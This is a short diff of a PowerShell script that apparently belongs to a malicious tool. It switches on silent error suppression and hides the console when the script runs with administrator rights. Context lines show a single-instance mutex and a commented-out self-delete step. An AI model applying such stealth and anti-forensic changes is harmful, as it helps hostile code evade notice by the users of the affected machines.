@@ -1,5 +1,5 @@
-#$ErrorActionPreference = 'SilentlyContinue' # Ignore all warnings
-#$ProgressPreference = 'SilentlyContinue' # Hide all Progresses
+$ErrorActionPreference = 'SilentlyContinue' # Ignore all warnings
+$ProgressPreference = 'SilentlyContinue' # Hide all Progresses
 
 # Single Instance (no overloads)
 function MUTEX-CHECK {
@@ -834,7 +834,7 @@ function Hide-Console
 }
 
 if (CHECK_IF_ADMIN -eq $true) {
-    #Hide-Console
+    Hide-Console
     MUTEX-CHECK
     # Self-Destruct
     # Remove-Item $PSCommandPath -Force 
